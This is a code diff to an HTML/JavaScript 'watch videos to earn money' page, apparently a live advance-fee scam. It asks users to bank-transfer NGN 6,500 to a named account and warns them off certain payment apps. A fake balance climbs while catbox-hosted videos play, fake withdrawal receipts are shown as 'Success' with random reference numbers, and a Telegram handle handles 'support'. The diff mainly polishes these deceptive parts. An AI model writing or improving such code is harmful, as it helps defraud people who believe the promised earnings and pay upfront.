@@ -1039,31 +1039,53 @@ button:active { transform: scale(0.96); }
         <span>Bank Transfer</span>
         <span style="color:red;" onclick="showPage('page3')">Cancel</span>
     </div>
-    <div class="transferBox">
-        <h2>NGN 6,500</h2>
-        <p id="transferEmail"></p>
-        <p>Proceed to your bank app to complete this transfer.</p>
-        <hr>
-        <div class="row">
-            <span>Amount</span>
-            <span><b>NGN 6,500</b></span>
+    <div class="transferBox" style="background:white; border-radius:20px; padding:25px; margin:20px; text-align:center; box-shadow:0 2px 10px rgba(0,0,0,0.05);">
+        <div style="width:60px; height:60px; background:linear-gradient(135deg, #667eea, #764ba2); border-radius:50%; margin:0 auto 15px; display:flex; align-items:center; justify-content:center;">
+            <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
         </div>
-        <div class="row">
-            <span>Account Number</span>
-            <span class="copy" onclick="copyText('9736975047')">9736975047</span>
+        <h2 style="margin:0 0 5px 0; font-size:28px; color:#333;">NGN 6,500</h2>
+        <p id="transferEmail" style="color:#666; margin:0 0 5px 0; font-size:14px;"></p>
+        <p style="color:#999; font-size:13px; margin:0 0 20px 0;">Proceed to your bank app to complete this transfer.</p>
+
+        <div style="text-align:left; margin-top:20px;">
+            <div style="display:flex; justify-content:space-between; align-items:center; padding:15px 0; border-bottom:1px solid #f0f0f0;">
+                <div>
+                    <p style="margin:0; color:#999; font-size:12px;">Amount</p>
+                    <p style="margin:5px 0 0 0; font-size:18px; font-weight:bold; color:#333;">NGN 6,500</p>
+                </div>
+                <button onclick="copyText('6500')" style="background:#ff9800; color:white; border:none; padding:8px 20px; border-radius:8px; font-size:13px; cursor:pointer;">Copy</button>
+            </div>
+
+            <div style="display:flex; justify-content:space-between; align-items:center; padding:15px 0; border-bottom:1px solid #f0f0f0;">
+                <div>
+                    <p style="margin:0; color:#999; font-size:12px;">Account Number</p>
+                    <p style="margin:5px 0 0 0; font-size:18px; font-weight:bold; color:#1a73e8;">9736975047</p>
+                </div>
+                <button onclick="copyText('9736975047')" style="background:#ff9800; color:white; border:none; padding:8px 20px; border-radius:8px; font-size:13px; cursor:pointer;">Copy</button>
+            </div>
+
+            <div style="display:flex; justify-content:space-between; align-items:center; padding:15px 0; border-bottom:1px solid #f0f0f0;">
+                <div>
+                    <p style="margin:0; color:#999; font-size:12px;">Bank</p>
+                    <p style="margin:5px 0 0 0; font-size:16px; color:#333;">Paystack Titan</p>
+                </div>
+            </div>
+
+            <div style="display:flex; justify-content:space-between; align-items:center; padding:15px 0;">
+                <div>
+                    <p style="margin:0; color:#999; font-size:12px;">Account Name</p>
+                    <p style="margin:5px 0 0 0; font-size:16px; color:#333;">KA | TS AGENT</p>
+                </div>
+            </div>
         </div>
-        <div class="row">
-            <span>Bank</span>
-            <span>Paystack Titan</span>
+
+        <div style="border:2px solid #ff4444; border-radius:12px; padding:15px; margin:20px 0; background:#fff5f5;">
+            <p style="margin:0; color:#ff4444; font-size:13px; font-weight:bold; text-align:center;">
+                ⚠️ WARNING: Do NOT use Opay for this transfer. Transactions via Opay will be declined!
+            </p>
         </div>
-        <div class="row">
-            <span>Account Name</span>
-            <span>KA | TS AGENT</span>
-        </div>
-        <div class="warning">
-            WARNING: Do NOT use Opay and Kuda for this transfer.
-        </div>
-        <button class="payBtn" onclick="confirmTransfer(event)">
+
+        <button onclick="confirmTransfer(event)" style="width:100%; padding:16px; background:#ff9800; color:white; border:none; border-radius:12px; font-size:16px; font-weight:bold; cursor:pointer; margin-top:10px;">
             I have made this Transfer
         </button>
     </div>
@@ -1120,8 +1142,8 @@ button:active { transform: scale(0.96); }
     <div class="earn-section" id="earnSection">
         <h2>Watch Videos to Earn Money</h2>
         <div class="video-container" id="videoContainer">
-            <video id="adVideo" controls autoplay muted playsinline>
-                <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
+            <video id="adVideo" controls width="100%" height="240">
+                <source src="https://files.catbox.moe/alzmuu.mp4" type="video/mp4">
             </video>
         </div>
         <p class="earn-hint">
@@ -1167,8 +1189,6 @@ button:active { transform: scale(0.96); }
         </div>
     </div>
 </div>
-
-
 
 <!-- PAGE 9 - RECEIPT -->
 <div id="page9" class="page">
@@ -1221,12 +1241,20 @@ button:active { transform: scale(0.96); }
 let currentBalance = 6500;
 const MAX_BALANCE = 900000;
 const INCREMENT_AMOUNT = 3000;
-const INCREMENT_INTERVAL = 6000;
+const INCREMENT_INTERVAL = 7000;
 let balanceInterval = null;
 let touchStartY = 0;
 let isLightMode = false;
-
-
+let isVideoPlaying = false;
+let currentVideoIndex = 0;
+let withdrawalHistory = [];
+const videoList = [
+    "https://files.catbox.moe/alzmuu.mp4",
+    "https://files.catbox.moe/mp1s81.mp4",
+    "https://files.catbox.moe/o1fg38.mp4",
+    "https://files.catbox.moe/vys0au.mp4",
+    "https://files.catbox.moe/pbcn1l.mp4"
+];
 
 // ========== PAGE NAVIGATION ==========
 showPage("page1");
@@ -1318,14 +1346,14 @@ function goDashboard() {
 function startBalanceIncrement() {
     if (balanceInterval) clearInterval(balanceInterval);
     balanceInterval = setInterval(() => {
-        if (currentBalance < MAX_BALANCE) {
-            currentBalance += 5000;
+        if (isVideoPlaying && currentBalance < MAX_BALANCE) {
+            currentBalance += 3000;
             if (currentBalance > MAX_BALANCE) currentBalance = MAX_BALANCE;
             updateBalanceDisplay();
-        } else {
+        } else if (currentBalance >= MAX_BALANCE) {
             stopBalanceIncrement();
         }
-    }, 3000);
+    }, 7000);
 }
 
 function stopBalanceIncrement() {
@@ -1344,23 +1372,50 @@ function updateBalanceDisplay() {
 
 function randomizeVideo() {
     const video = document.getElementById("adVideo");
-    const randomUrl = adVideos[Math.floor(Math.random() * adVideos.length)];
-    video.src = randomUrl;
+    if (!video) return;
+
+    // Set up video queue
+    currentVideoIndex = 0;
+    video.src = videoList[currentVideoIndex];
     video.load();
+
+    // Play/pause handlers
+    video.onplay = function() {
+        isVideoPlaying = true;
+    };
+    video.onpause = function() {
+        isVideoPlaying = false;
+    };
+
+    // When video ends, play next one
+    video.onended = function() {
+        isVideoPlaying = false;
+        currentVideoIndex++;
+        if (currentVideoIndex < videoList.length) {
+            video.src = videoList[currentVideoIndex];
+            video.load();
+            video.play().catch(e => console.log("Autoplay prevented"));
+        } else {
+            // All videos done, restart from first
+            currentVideoIndex = 0;
+            video.src = videoList[currentVideoIndex];
+            video.load();
+            video.play().catch(e => console.log("Autoplay prevented"));
+        }
+    };
+
     video.play().catch(e => console.log("Autoplay prevented"));
 }
-
-
 
 // ========== LIGHT MODE TOGGLE ==========
 function toggleLightMode() {
     isLightMode = !isLightMode;
     const page7 = document.getElementById("page7");
-    const page8 = document.getElementById("page8");
+    
 
     if (isLightMode) {
         page7.style.background = "#f1f5f9";
-        page8.style.background = "#f1f5f9";
+        
         document.querySelectorAll("#page7 .dashboard-header, #page7 .earn-section h2").forEach(el => {
             el.style.color = "#1e293b";
         });
@@ -1372,7 +1427,7 @@ function toggleLightMode() {
         });
     } else {
         page7.style.background = "#1e293b";
-        page8.style.background = "#1e293b";
+        
         document.querySelectorAll("#page7 .dashboard-header, #page7 .earn-section h2").forEach(el => {
             el.style.color = "white";
         });
@@ -1394,8 +1449,13 @@ function showNav(tab) {
         showPage('page7');
         window.scrollTo({ top: 0, behavior: 'smooth' });
     }
-    if (tab === 'profile') showToast("Profile coming soon!");
-    if (tab === 'history') showToast("History coming soon!");
+    if (tab === 'profile') {
+        showPage('page7');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+    if (tab === 'history') {
+        showHistory();
+    }
     if (tab === 'support') openContact();
 }
 
@@ -1416,16 +1476,26 @@ function processWithdraw() {
         return;
     }
 
+    const now = new Date();
+    const timeStr = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }) + 
+                    " " + now.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' });
+
+    // Save to history
+    withdrawalHistory.unshift({
+        amount: parseInt(amount),
+        accName: accName.toUpperCase(),
+        accNum: accNum,
+        bank: bank.toUpperCase(),
+        date: timeStr,
+        ref: Math.floor(10000000 + Math.random() * 90000000)
+    });
+
     // Update receipt
     document.getElementById("receiptAmount").textContent = "₦ " + parseInt(amount).toLocaleString();
     document.getElementById("receiptAccName").textContent = accName.toUpperCase();
     document.getElementById("receiptAccNum").textContent = accNum;
     document.getElementById("receiptBank").textContent = bank.toUpperCase();
-    document.getElementById("receiptRef").textContent = Math.floor(10000000 + Math.random() * 90000000);
-
-    const now = new Date();
-    const timeStr = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }) + 
-                    " " + now.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' });
+    document.getElementById("receiptRef").textContent = withdrawalHistory[0].ref;
     document.getElementById("receiptTime").textContent = timeStr;
 
     // Deduct from balance
@@ -1474,7 +1544,7 @@ function confirmTransfer(event) {
 
         btn.innerText = "I have made this Transfer";
         btn.disabled = false;
-    }, 6000);
+    }, 7000);
 }
 
 function copyText(text) {
@@ -1484,6 +1554,32 @@ function copyText(text) {
 }
 
 // ========== TOAST ==========
+function showHistory() {
+    const historyPage = document.getElementById("page10");
+    const historyList = document.getElementById("historyList");
+
+    if (withdrawalHistory.length === 0) {
+        historyList.innerHTML = '<p style="color:#94a3b8; text-align:center; padding:40px 20px;">No withdrawals yet.</p>';
+    } else {
+        historyList.innerHTML = withdrawalHistory.map(item => `
+            <div style="background:#2d3748; border-radius:15px; padding:20px; margin-bottom:15px;">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                    <span style="color:#22c55e; font-size:20px; font-weight:bold;">₦ ${item.amount.toLocaleString()}</span>
+                    <span style="color:#22c55e; font-size:13px; background:#22c55e20; padding:4px 12px; border-radius:20px;">Success</span>
+                </div>
+                <div style="color:#a0aec0; font-size:13px; line-height:1.8;">
+                    <div>Ref: ${item.ref}</div>
+                    <div>${item.accName}</div>
+                    <div>${item.accNum} • ${item.bank}</div>
+                    <div style="color:#64748b; margin-top:5px;">${item.date}</div>
+                </div>
+            </div>
+        `).join('');
+    }
+
+    showPage('page10');
+}
+
 function showToast(message) {
     const toast = document.getElementById("toast");
     toast.textContent = message;
@@ -1493,6 +1589,25 @@ function showToast(message) {
     }, 2500);
 }
 </script>
+
+
+<!-- PAGE 10 - HISTORY -->
+<div id="page10" class="page" style="min-height:100vh; display:flex; flex-direction:column;">
+    <div style="background:#1e293b; padding:20px; display:flex; align-items:center; gap:15px; border-bottom:1px solid #334155;">
+        <button onclick="showPage('page7')" style="background:none; border:none; color:white; font-size:20px; cursor:pointer;">←</button>
+        <h2 style="color:white; margin:0; font-size:20px;">Withdrawal History</h2>
+    </div>
+    <div style="flex:1; padding:20px; max-width:500px; margin:0 auto; width:100%;" id="historyList">
+        <p style="color:#94a3b8; text-align:center; padding:40px 20px;">No withdrawals yet.</p>
+    </div>
+    <div style="padding:20px; max-width:500px; margin:0 auto; width:100%;">
+        <div style="background:#fef3c7; border:1px solid #f59e0b; border-radius:12px; padding:15px;">
+            <p style="margin:0; color:#92400e; font-size:13px; line-height:1.6; text-align:center;">
+                <strong>📌 Note:</strong> If your withdrawal has not been credited to your bank account within 24 hours, please contact our support team on Telegram <strong>@costomercafe</strong> for assistance.
+            </p>
+        </div>
+    </div>
+</div>
 
 </body>
 </html>
